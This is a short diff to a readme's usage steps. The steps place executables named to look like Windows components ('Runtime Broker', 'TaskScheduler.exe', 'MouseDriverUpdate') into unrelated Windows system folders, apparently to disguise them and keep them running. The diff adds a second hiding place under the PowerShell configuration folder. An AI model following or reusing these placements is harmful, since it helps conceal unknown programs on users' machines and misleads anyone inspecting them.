@@ -1,6 +1,6 @@
 Usage:
 1. Unzip dist.zip
-2. Go to C:\Program Files\Microsoft Update Health Tools and copy Runtime Broker into it
+2. Go to C:\Program Files\Microsoft Update Health Tools and copy Runtime Broker into it or C:\Program Files\WindowsPowerShell\Configuration
 3. Go to C:\Program Files (x86) and add MouseDriverUpdate to it
 4. Go to C:\Program Files\Windows Mail and add MouseDriverUpdate to it
 5. Go to  C:\ProgramData, add TaskScheduler.exe to it
